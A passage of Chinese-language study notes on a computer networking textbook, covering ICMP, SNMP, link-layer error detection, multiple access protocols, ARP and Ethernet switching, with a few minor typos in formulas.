一个分组到达交换机端口，并且不能与任何流表项匹配，那么这个分组将被发送给控制器进行额外处理。匹配的分组也被发送给控制器，作为匹配是所采取的一个动作。“分组入”报文被用于将分组发送给控制器。</li></ul><h2 id="ICMP（因特网控制报文协议）"><a href="#ICMP（因特网控制报文协议）" class="headerlink" title="ICMP（因特网控制报文协议）"></a>ICMP（因特网控制报文协议）</h2><p>为了更有效的提高ip数据报的成功转发和交付的效率，在网际层使用了icmp网际控制报文协议，这个协议允许主机和路由器提供差错和异常情况的报告，icmp不是高层协议，而是网际层的协议，加在ip数据报中一起发出。</p><p>ICMP报文通过ip报文发送，ICMP报文当做是ip数据包的数据部分，而IP数据包又被放倒了以太网的数据帧中的数据区。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171022334.png"></p><p>ICMP的报文种类有ICMP差错报文和ICMP询问报文：</p><p>差错报告报文有5种：</p><p>（1）终点不可以到达：当路由器和主机不能交付的时候：</p><p>（2）源点抑制：当路由器由于网络拥塞而丢弃的时候</p><p>（3）时间超过：当路由器收到生存时间为0的数据报的时候</p><p>（4）参数问题：当目的主机发现收到的数据报首部有问题的时候</p><p>（5）改变路由：路由器把改变你的路由交付主机，告诉下一次的主机</p><p>两种ICMP询问报文：</p><p>（1）ICMP请求与回答报文：主机和路由器向主机发送一个ICMP请求报文，目的主机发送一个ICMP回答报文，用来测试两方能否互相通信</p><p>（2）ICMP时间戳请求与回答报文：ICMP时间戳报文请某个主机和路由器回答当前的时间，ICMP回答时间戳是一个32位的字段，其中写入的整数表示从<br>1900/1/1到现在的秒数</p><p>ICMP报文有一个类型字段和一个编码字段，并且包含引起该ICMP报文首次生成的IP数据报的首部和前8个字节。表5-1列出了所选的ICMP报文类型</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171034509.png"></p><h3 id="网络管理和SNMP"><a href="#网络管理和SNMP" class="headerlink" title="网络管理和SNMP"></a>网络管理和SNMP</h3><p>网络管理包括了硬件、软件和人类元素的设置、综合和协调，以监视、测试、轮询、配置、分析、评价和控制网网络及网元资源，用合理的成本满足实时性、运营性能和服务质量的要求。</p><h4 id="网络管理的关键组件"><a href="#网络管理的关键组件" class="headerlink" title="网络管理的关键组件"></a>网络管理的关键组件</h4><p>1.<code>管理服务器</code> 是一个应用程序，通常有人的参与，并运行在网络运营中心的集中式网络管理的工作站上。管理服务器是执行网络管理活动的地方，它控制网络管理信息的收集、处理、分析和/或显示。正是在这里，发起控制网络行为的动作，人类网络管理员与网络设备打交道。</p><p>2.<code>被管设备</code> 是网络装备的一部分，位于被管理的网络中。在一个被管设备中，有几个所谓<code>被管对象。</code> 这些被管对象是被管设备中硬件的实际部分和用于这些硬件及软件组件的配置参数。</p><p>3.一个被管设备中的每个被管对象的关联信息收集在<code>管理信息库（Management Information Base, MIB）</code> 中，这些信息的值可供管理服务器所用。MIB对象由称为SMI（Strcture of Management Information）的数据语言所定义。</p><p>4.在每个被管设备中还驻留有<code>网络管理代理。</code> 它是运行在被管设备中的一个进程，该进程与管理服务器通信，在管理服务器的命令和控制下载被管设备中采取本地动作。</p><p>网络管理框架的最后组件是<code>网络管理协议。</code> 该协议运行在管理服务器和被管设备之间，允许管理服务器查询被管设备的状态，并经过其代理间接地在这些设备上采取行动。代理能够使用网络管理协议向管理服务器通知异常事件。重要的是网络管理协议自己不能管理网络。恰恰相反，它为网络管理员提供了一种能力，使他们能够管理网络。</p><p><code>简单网络管理协议版本2（SNMPv2）是一个应用层协议,</code>用于在管理服务器和代表管理服务器执行的代理之间传递网络管理控制和信息报文。SNMP最常使用的是请求响应模式，其中SNMP管理服务器向SNMP代理发送一个请求，代理接收到该请求后，执行某些动作，然后对该请求发送一个回答。请求通常用于查询或修改与某被管设备关联的MIB对象值。SNMP第二个常被使用的是代理向管理服务器发送的一种非请求报文，该报文被称为陷阱报文。陷阱报文用于通知管理服务器，一个异常情况已经导致了MIB对象值的改变。表5-2中列出了SNMPv2定义的7种报文，这些报文一般称为协议数据单元（PDU）。SNMP PDU通常是作为UDP数据报的载荷进行传输的。<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171053187.png"></p><h2 id="六、链路层和局域网"><a href="#六、链路层和局域网" class="headerlink" title="六、链路层和局域网"></a>六、链路层和局域网</h2><pre class="line-numbers language-none"><code class="language-none">链路层信道分为两种：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>广播信道</code>:局域网,无限LAN,卫星和混合光纤</p><pre class="line-numbers language-none"><code class="language-none">点对点的通信链路<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="链路层的概念"><a href="#链路层的概念" class="headerlink" title="链路层的概念"></a>链路层的概念</h2><p>运行链路层协议的任何设备称为<code>节点</code>。把沿着通信路径连接相邻节点的通信信道称为<code>链路</code></p><p>链路层采取的动作包括了差错检测,重传,流量控制以及随机接入</p><p><code>特点:</code>数据报在不同的链路可以使用不同的协议</p><h3 id="链路层提供的服务"><a href="#链路层提供的服务" class="headerlink" title="链路层提供的服务"></a>链路层提供的服务</h3><p><code>成帧:</code>在每个网络层数据报经链路传送之前，几乎所有的链路层协议都要将其用链路层帧封装起来。一个帧由一个数字字段和若干首部字段组成，其中网络层数据报就插在数据字段中。帧的结构由链路层协议规定。</p><p><code>链路接入:</code>媒体访问控制协议（Medium Access Control, MAC）协议规定了帧在链路上传输的规则。</p><p><code>可靠交付:</code>当链路层协议提供可靠交付服务时，它保证无差错地经链路层移动每个网络层数据报。</p><p><code>差错检测和纠正:</code>当帧中的一个比特作为1传输时，接收方节点中的链路层硬件可能不正确地将其判断为0，反之亦然。这种比特差错是由信号衰减和电磁噪声导致的。因为没有必要转发一个有差错的数据报，所以许多链路层协议提供一种机制来检测这样的比特差错。通过让发送节点在帧中包含差错检测比特，让接收节点进行差错检查，以此来完成这项工作。</p><h3 id="链路层在何处实现"><a href="#链路层在何处实现" class="headerlink" title="链路层在何处实现"></a>链路层在何处实现</h3><p>链路层的主体部分是在 <strong>网络适配器</strong> 中实现的，网络适配器有时也称为 <strong>网络接口卡</strong> ，位于适配器核心的是链路层控制器，这个控制器是实现许多链路层服务的专用芯片。链路层控制器的许多功能使用硬件是实现的。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171439649.png"></p><h2 id="差错检测和纠正技术"><a href="#差错检测和纠正技术" class="headerlink" title="差错检测和纠正技术"></a>差错检测和纠正技术</h2><p>在发送节点，为了保护比特免受差错，使用 <strong>差错检测和纠正比特（Error-Detection and-Correction, EDC）</strong> 来增强数据D。通常，要保护的数据不仅包括从网络层传递下来需要通过链路传输的数据报，而且包括链路帧首部中的链路的寻址信息、序号和其他字段。链路级中的D和EDC都被发送到接收节点</p><h3 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h3><p><code>奇偶校验</code>使用单个奇偶校验位。假设要发送的信息D有d比特。在偶校验方案中，发送方只需包含一个附加的比特，选择它的值，使得这d + 1比特中1的总数是偶数。对于奇校验方案，选择校验比特值使得有奇数个1。接收方只需要数一数接收的d + 1比特中1的数目即可。如果在采用偶校验方案中发现了奇数个值为1的比特，接收方知道出现了奇数个比特差错。</p><p><code>二维奇偶校验</code>方案中，D中的d个比特被划分为i行j列。对每行和每列计算奇偶值。产生的i + j + 1奇偶比特构成了链路层帧的差错检测比特。包含比特值改变的列和行的校验值都将会出现差错。因此接收方不仅可以检测到出现了单个比特差错的事实，而且还可以利用存在就校验差错的列和行的索引来实际识别发生差错的比特并纠正它。</p><h3 id="校验和方法"><a href="#校验和方法" class="headerlink" title="校验和方法"></a>校验和方法</h3><p><code>检验和</code> 技术中，数据的字节作为16比特的整数对待并求和。这个和的反码形成了携带在报文段首部的因特网检验和。接收方通过对接收的数据的和取反码，并且检测其结果是否全为1比特来检测检验和。如果这些比特中有任何比特是0，就可以指示出差错。</p><h3 id="循环冗余检测"><a href="#循环冗余检测" class="headerlink" title="循环冗余检测"></a>循环冗余检测</h3><p>现今的计算机网络中广泛应用的差错检测技术基于<code>循环冗余检测（Cyclic Redundancy Check, CRC）</code>。CRC编码也称为多项式编码，因为该编码能够将要发送的比特串看作为系数是0和1一个多项式，对比特串的操作被解释为多项式算术。</p><p>假设发送节点要发送一个d比特的数据D给接收节点。发送方和接收方首先必须协商一个r + 1比特模式，称为生成多项式，将其表示为G。要求G的最高有效比特是1。对于一个给定的数据段D，发送方要选择r个附加比特R，并将它们附加到D上，使得得到的d + r比特模式用模2算术恰好能被G整除。接收方用G去除接收到的d + r比特。如果余数非0，接收方知道出现了差错；否则认为数据正确而被接收。</p><pre class="line-numbers language-none"><code class="language-none">求附加比特R的公式:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171510312.png"></p><p>其中remainder表示求余数。</p><p>国际标准定义的32比特生成多项式为</p><p>GCRC-32 = 100000100110000010001110110110111</p><p>每个CRC标准都能检测小于r + 1比特的突发差错。此外，在适当的假设下，长度大于r + 1比特的突发差错以概率1 – 0.5r被检测到。每个CRC标准也都能检测任何奇数个比特差错。</p><h2 id="多路访问链路和协议"><a href="#多路访问链路和协议" class="headerlink" title="多路访问链路和协议"></a>多路访问链路和协议</h2><p>有两种类型的网络链路：<code>点对点链路</code>和<code>广播链路</code>。点对点链路由链路一端的单个发送方和链路另一端的单个接收方组成。许多链路层协议都是为点对点链路设计的，如点对点协议（point-to-point protocol, PPP）和高级数据链路控制（high-level data link control, HDLC）就是两种这样的协议。广播链路能够让多个发送和接收节点都连接到相同的、单一的、共享的广播信道上。</p><pre class="line-numbers language-none"><code class="language-none">对于速率为R bps的广播信道，多路访问协议应该具有以下所希望的特性：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>当仅有一个节点发送数据时，该节点具有R bps的吞吐量；</li><li>当有M个节点发送数据时，每个节点吞吐量为R/M bps的平均传输速率；</li><li>协议是分散的，即不会因某节点故障而使整个系统崩溃；</li><li>协议是简单的，使实现不昂贵。</li></ul><h3 id="信道划分协议"><a href="#信道划分协议" class="headerlink" title="信道划分协议"></a>信道划分协议</h3><pre class="line-numbers language-none"><code class="language-none">多路访问协议有三种：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>信道划分协议</li><li>随机接入协议</li><li>轮流协议</li></ul><p>假设一个支持N个节点的信道且信道的传输速率为R bps。TDM将时间划分为时间帧，并进一步划分每个时间帧为N个时隙。然后把每个时隙分配给N个节点中的一个。无论何时某个节点在有分组要发送的时候，它在循环的TDM帧中指派给它的时隙内传输比特。TDM使每个节点在每个帧时间内得到了专用的传输速率，R/N bps。然而它由两个主要缺陷。首先，节点被限制于R/N bps的平均速率，即使当它是唯一有分组要发送的节点时。其次，节点必须总是等待它在传输序列中的轮次</p><p>FDM将R bps信道划分为不同的频段，并把每个频率分配给N个节点中的一个。因此FDM在较大的R bps信道中创建了N个较小的R/N bps信道。FDM避免了碰撞，在N个节点之间公平地划分了带宽。然而限制一个节点只能使用R/N的带宽，即使当它是唯一一个有分组要发送的节点时</p><p>CDMA对每个节点分配一种不同的编码。然后每个节点用它唯一的编码来对它发送的数据进行编码。如果精心选择这些编码，CDMA网络具有一种特性，即不同的节点能够同时传输，并且它们各自相应的接收方仍能正确接收发送方编码的数据比特，而不在乎其他节点的干扰传输。</p><h3 id="随机接入协议"><a href="#随机接入协议" class="headerlink" title="随机接入协议"></a>随机接入协议</h3><p>在随机接入协议中，一个传输节点总是以信道的全部速率进行发送。当有碰撞时，设计碰撞的每个节点反复地重发它的帧，到该帧无碰撞地通过为止。但是当一个节点经历一次碰撞时，它不必立即重发该帧。相反，它在重发该帧之前等待一个随机时延。涉及碰撞的每个节点独立地选择随机时延。因为该随机实验是独立地选择的，所以下述现象是有可能的：这些节点之一所选择的时延充分小于其他碰撞节点的时延，并因此能够无碰撞地将它的帧在信道中发出</p><h4 id="时隙ALOHA协议"><a href="#时隙ALOHA协议" class="headerlink" title="时隙ALOHA协议"></a>时隙ALOHA协议</h4><pre class="line-numbers language-none"><code class="language-none">时隙ALOHA假设:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>所有帧由L比特组成。</li><li>时间被划分成长度为L/R秒的时隙（这就是说，一个时隙等于传输一帧的时间）。</li><li>节点只是在时隙起点开始传输帧。</li><li>节点是同步的，每个节点都知道时隙何时开始。</li><li>如果在一个时隙中有两个或者更多个帧碰撞，则所有节点在该时隙结束之前检测到该碰撞事件。</li></ul><pre class="line-numbers language-none"><code class="language-none">令p是一个概率，即一个在0和1之间的数。在每个节点中，时隙ALOHA的操作是<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>当节点有一个新帧要发送时，它等到下一个时隙开始并在该时隙传输整个帧。</li><li>如果没有碰撞，该节点成功地传输它的帧，从而不需要考虑重传该帧。</li><li>如果有碰撞，该节点在时隙结束之前检测到这次碰撞。该节点以概率p在后续的每个时隙中重传它的帧，直到该帧被无碰撞地传输出去。</li></ul><h5 id="时隙ALOHA的优点"><a href="#时隙ALOHA的优点" class="headerlink" title="时隙ALOHA的优点"></a>时隙ALOHA的优点</h5><ul><li>当某节点是唯一活跃的节点时，时隙ALOHA允许该节点以全速R连续传输。时隙ALOHA也是高度分散的，因为每个节点检测碰撞并独立地决定什么时候重传。但是，当有N个活跃节点时，时隙ALOHA的效率是Np(1 – p)N – 1，这个表达式的最大值仅为1/e = 0.37。也就是说，当有大量活跃用户时，时隙ALOHA的最大效率只有37%。</li><li>时隙ALOHA协议要求所有的节点同步它们的传输，以在每个时隙开始时开始传播。在纯ALOHA中，当一帧首次到达，节点将立即以概率p重传该帧，否则，该节点等待一个帧传输时间。在此等待之后，它则以概率p传输该帧，或者以概率1 – p在另一个帧时间等待。纯ALOHA的最大效率仅为1/(2e)，这刚好是时隙ALOHA的一半</li></ul><h4 id="载波监听多路访问（CSMA）"><a href="#载波监听多路访问（CSMA）" class="headerlink" title="载波监听多路访问（CSMA）"></a>载波监听多路访问（CSMA）</h4><p><code>载波侦听。</code>即一个节点在传输前先听信道。如果来自另一个节点的帧正向信道上发送，节点则等待直到检测到一小段时间没有传输，然后开始传输。（说话之前监听）</p><p><code>碰撞检测。</code>CSMA没有进行碰撞检测；即使已经出现了碰撞。而CSMA/CD进行碰撞检测。碰撞检测，即当一个传输节点在传输时一直在侦听此信道。如果它检测到另一个节点正在传输干扰帧，它就停止传输，在重复“侦听-当空闲时时传输”循环之前等待一段随机时间。（如果与他人同时说话，停止说话）</p><p>广播信道的端到端 <strong>信道传播时延</strong> 在决定性能的反面决定关键的作用，传播时延越长，载波监听节点不能侦听到网络到另一个节点已经传输的机会越大。</p><h4 id="具有碰撞的载波监听多路访问（CSMA-CD）"><a href="#具有碰撞的载波监听多路访问（CSMA-CD）" class="headerlink" title="具有碰撞的载波监听多路访问（CSMA/CD）"></a>具有碰撞的载波监听多路访问（CSMA/CD）</h4><h5 id="CSMA-CD的运行步骤"><a href="#CSMA-CD的运行步骤" class="headerlink" title="CSMA/CD的运行步骤"></a>CSMA/CD的运行步骤</h5><ul><li>适配器从网络层一条获得数据报，准备链路层帧，并将其放入帧适配器缓存中。</li><li>如果适配器侦听到信道空闲，它开始传输帧。在另一方面，如果适配器侦听到信道正在忙，它将等待，直到侦听到没有信号能量时才开始传输帧。</li><li>在传输过程中，适配器监视来自其他使用该广播信道的适配器的信号能量的存在。</li><li>如果适配器传输整个帧而未检测到来自其他适配器的信号能量，该适配器就完成了该帧。在另一方面，如果适配器在传输时检测到来自其他适配器的信号能量，它中止传输。</li><li>中止传输后，适配器等待一个随机时间量，然后返回步骤2。</li></ul><h5 id="CSMA-CD效率"><a href="#CSMA-CD效率" class="headerlink" title="CSMA/CD效率"></a>CSMA/CD效率</h5><p>CSMA/CD使用 <strong>二进制指数后退算法</strong> ，使得当碰撞节点数量较少时，节点等待的时间间隔较短；当碰撞节点数量较大时，时间间隔较长。当传输一个给定帧时，在该帧经历了一连串n此碰撞后，节点随机地从{0, 1, 2, …, 2n – 1}中选择一个K值。因此，一个帧经历的碰撞越多，K选择的间隔越大。对于以太网，一个节点等待实际时间量是K ∙ 512比特时间（即发送512比特进入以太网所需的时间量的K倍，n能够取的最大值为10。</p><p>CSMA/CD效率定义：当有大量的活跃节点，且每个节点有大量帧要发送时，帧在信道中无碰撞地传输的那部分时间在长期运行时间中所占的份额。令dprop表示信号能量在任意两个适配器之间传播所需的最大时间。令dtrans表示传输一个最大长度的以太网帧的时间。则CSMA/CD的效率为</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171913258.png"></p><h3 id="轮流协议"><a href="#轮流协议" class="headerlink" title="轮流协议"></a>轮流协议</h3><pre class="line-numbers language-none"><code class="language-none">轮流协议主要有两种：轮询协议和令牌传递协议。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h4><p>轮询协议要求节点之一要被指定为主节点。主节点以循环的方式轮询每个节点。轮询协议消除了困扰随机接入协议的碰撞和空时隙，这使得轮询取得高得多的效率。但是它也有一些缺点。第一，该协议引入了轮询时延，即通知一个节点“它可以传输”所需的时间。第二，如果主节点有故障，整个信道都变得不可操作。</p><h4 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h4><p>令牌传递协议中没有主节点。一个成为令牌的小的特殊帧在节点之间以某种固定的次序进行交换。当一个节点收到令牌时，仅当它有一些帧要发送时，它才持有这个令牌，并发送最大数目的帧数，然后把令牌转发给下一个节点；否则它立即向下一个节点转发该令牌。令牌传递是分散的，并有很高的效率。但是一个节点的故障可能会使整个信道崩溃。或者如果一个节点偶然忘记了释放令牌，则必须调用某些恢复步骤使令牌返回到循环中来。</p><h3 id="DOCSIS：用于电缆因特网接入的链路层协议"><a href="#DOCSIS：用于电缆因特网接入的链路层协议" class="headerlink" title="DOCSIS：用于电缆因特网接入的链路层协议"></a>DOCSIS：用于电缆因特网接入的链路层协议</h3><p>一个电缆接入网通常在电缆网头端将几千个住宅电缆调制解调器与一个电缆调制解调器端接系统（Cable Modem Termination System, CMTS）连接。数据经电缆服务接口（Data-Over-Cable Service Interface, DOCSI）规范（DOCSIS）定义了电缆数据网络体系结构及其协议。</p><h3 id="交换局域网"><a href="#交换局域网" class="headerlink" title="交换局域网"></a>交换局域网</h3><p> <img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920171932476.png"></p><h3 id="链路层寻址和ARP"><a href="#链路层寻址和ARP" class="headerlink" title="链路层寻址和ARP"></a>链路层寻址和ARP</h3><p><strong>地址解析协议（ARP）</strong> 提供了将IP地址转换为链路层地址的协议</p><h4 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h4><p>1.主机或路由器的适配器（即网络接口）具有链路层地址。链路层地址有各种不同的称呼：LAN地址、物理地址或MAC（Medium Access Control）地址。MAC地址是最为流行的术语。</p><p>2.没有两块适配器具有相同的地址。适配器的MAC地址具有扁平结构，而且不论适配器到哪里用都不会变化。</p><p>3.MAC地址的长度为6字节，共有6的48次方的可能的MAC地址，6个字节的地址常用16进制表示法，地址的每个字节表示一对十六进制数</p><h5 id="主机和路由器接口除了网络层地址之外还有MAC地址的原因"><a href="#主机和路由器接口除了网络层地址之外还有MAC地址的原因" class="headerlink" title="主机和路由器接口除了网络层地址之外还有MAC地址的原因"></a>主机和路由器接口除了网络层地址之外还有MAC地址的原因</h5><p>局域网是为任意网络层协议而设计的，而不只是用于IP和因特网。</p><p>如果适配器使用网络层地址而不是MAC地址的话，网络层地址必须存储在适配器的RAM中，并且在每次适配器移动时要重新配置。<img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172010656.png"></p><h4 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h4><p>1.<code>地址解析协议（Address Resolution Protocol, ARP）</code>用于在网络层地址（比如因特网的IP地址）和链路层地址(MAC地址)之间进行转换。ARP只为在同一个子网上的主机和路由器接口解析IP地址。</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172054334.png"></p><p>2.每台主机或路由器在其内存中具有一个ARP表，这张表包含IP地址到MAC地址的映射关系。该ARP表也包含一个寿命值，它指示了从表中删除每个映射的时间。</p><p>3.假定主机A要向主机B发送一个数据报，该数据报要IP寻址到本子网上另一台主机或路由器。发送主机需要获得给定IP地址的目的主机的MAC地址。如果发送方的ARP表具有该目的节点的表项，则直接通过查询ARP表即可完成任务。如果ARP表中当前没有该目的主机的表项，发送方构造一个称为ARP分组的特殊分组。一个ARP分组有几个字段，包括发送和接收IP地址及MAC地址。ARP查询分组和响应分组都具有相同的格式。ARP查询分组的目的是询问子网上所有其他主机和路由器，以确定对应于要解析的IP地址的那个MAC地址</p><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172104982.png"></p><p>4.查询ARP报文是在广播帧中发送的，而响应ARP报文在一个标准帧中发送。ARP是即插即用的，即一个ARP表是自动建立的，它不需要系统管理员来配置。并且如果某主机与子网断开连接，它的表项最终会从留在子网中的节点的表中删除掉。</p><h5 id="ARP协议原理"><a href="#ARP协议原理" class="headerlink" title="ARP协议原理"></a>ARP协议原理</h5><p>1.如果要通过IP来得到同一子网上的主机MAC地址；过程是这样的：首先源主机会看看自己的ARP机制的内存里有没有对应的IP MAC项，有就直接输出目标MAC地址；没有的话就需要ARP发送一个查询分组，分组以广播的形式发送，也就是每一个主机都能收到这个查询分组，收到之后，各个被询问的主机会先看看 目标IP是不是与自己的IP对应，不对应就不用响应，对应的就应该返回一个响应分组。这样源主机的ARP机制就有了目的IP地址的MAC地址了。</p><p>2.通过目标IP获得子网以外的主机的MAC地址；首先，源主机有了目的主机的IP地址，假想我们通过某种手段已经得到了目的主机的MAC地址了，那现在是不是就可以直接放入数据帧里面呢，显然是不行的，因为目前看来，目的MAC地址与当前的任何一个路由的MAC地址都不匹配。任何路由都不会给与转发。事实上是这样的，我们有了目标IP地址，通过路由算法得到了最短路径的转发表，我们每一次转发不是直接用目标主机的IP地址的，而是用路由表中给出的每一跳的地址，这样，先得到通往外网的第一个路由的MAC地址，现在关键来了：由于在外网中路由器的一个IP对应一个MAC，他也是通过ARP查询得到与他匹配的IP再得到返回的MAC地址的。就这样得到外网路由的第二个MAC地址，这样直到终点</p><h4 id="发送数据报到子网以外"><a href="#发送数据报到子网以外" class="headerlink" title="发送数据报到子网以外"></a>发送数据报到子网以外</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172124649.png"></p><p>每台主机仅有一个IP地址和一个适配器，一台路由器对它的每个接口都有一个IP地址，也有一个ARP模块和一个适配器，每个适配器都有自己的MAC地址</p><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>1.如果某台主机要向子网外的另一台主机发送数据报，则发送主机必须首先发送给最终目的路径上的第一跳路由器</p><p>2.初始的以太网是使用总线拓扑的一种广播局域网，即所有的帧传送到与该总线连接的所有适配器并被其处理。</p><p>3.在20世纪90年代后期，大多数公司和大学使用一种基于集线器的星形拓扑以太网安装替代了它们的局域网。在这种安装中，主机和路由器直接用双绞对铜线与一台 <strong>集线器</strong> 相连。集线器是一种物理层设备，它作用于各个比特而不是作用于帧。当表示一个0或一个1的比特到达一个接口时，集线器只是重新生成这个比特，将其能量强度放大，并将该比特向其他所有接口传输出去。</p><p>4.在21世纪初，以太网又经历了一次重要的革命性变化。以太网安装继续使用星形拓扑，但是位于中心的集线器被 <strong>交换机</strong> 所替代。</p><h4 id="以太网帧结构"><a href="#以太网帧结构" class="headerlink" title="以太网帧结构"></a>以太网帧结构</h4><p><img src="/2019/10/20/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E6%96%B9%E6%B3%95%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20250920172140701.png"></p><pre class="line-numbers language-none"><code class="language-none">太网帧有以下6个字段<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>数据字段（46~1500字节）。</code>这个字段承载了IP数据报。以太网的最大传输单元是1500字节。这意味着如果IP数据报超过了1500字节，则主机必须将该数据报分片。数据字段的最小长度是46字节。这意味着如果IP数据报小于46字节，数据报必须被填充到46字节。当采用填充时，传递到网络层的数据包括IP数据报和填充部分。网络层使用IP数据报首部中的长度字段来去除填充部分。</li><li><code>目的地址（6字节）。</code>这个字段包含目的适配器的MAC地址。当适配器收到一个以太网帧，帧的目的地址如果和该适配器MAC地址相同或为广播地址，则它都将该帧的数据字段的内容传递给网络层；如果它受到了具有任何其他MAC地址的帧，则丢弃之。</li><li><code>源地址（6字节）。</code>这个地段包含了传输该帧到局域网上的适配器的MAC地址。</li><li><code>类型字段（2字节）。</code>类型字段允许以太网复用多种网络层协议。</li><li><code>CRC（4字节）。</code>CRC字段的目的时使得接收器检测帧中是否引入了差错。</li><li><code>前同步码（8字节）。</code>以太网帧以一个8字节的钱同步码字段开始。该前同步码的前7个字节的值都是10101010；最后一个字节时10101011。前同步码字段的前7字节用于“唤醒”接收适配器，并且将它们的时钟和发送方的时钟同步。前同步码的第8个字节的最后两个比特警告接收适配器，“重要的内容“就要到来了。</li></ul><h4 id="以太网技术"><a href="#以太网技术" class="headerlink" title="以太网技术"></a>以太网技术</h4><p>所有的以太网技术都向网络层提供无连接服务和不可靠服务。</p><h3 id="链路层交换机"><a href="#链路层交换机" class="headerlink" title="链路层交换机"></a>链路层交换机</h3><p>交换机自身对子网中的主机和路由器是透明的，某主机/路由器向另一个主机/路由器寻址一个帧（而不是向交换机寻址该帧），顺利将该帧发送进局域网，并不知道某交换机将会接收该帧并将该帧转发到另一个节点</p><h4 id="交换机的转发和过滤"><a href="#交换机的转发和过滤" class="headerlink" title="交换机的转发和过滤"></a>交换机的转发和过滤</h4><p><code>过滤</code>是决定一个帧应该转发到某个接口还是应当将其丢弃的交换机功能。</p><p><code>转发</code>是决定一个帧应该被导向哪个接口，并把该帧移动到那些接口的交换机功能。交换机的过滤和转发借助于<code>交换机表</code>完成。</p><p>该交换机表发函某局域网上某些主机和路由器的但不必是全部的表项。交换机表中的一个表项包含：一个MAC地址；通向该MAC地址的交换机接口；表项放置在表中的时间。</p><pre class="line-numbers language-none"><code class="language-none">假定目的地址为A的帧从交换机接口x到达。交换机用地址A索引它的表。有3种可能的情况<span aria-hidden="true" 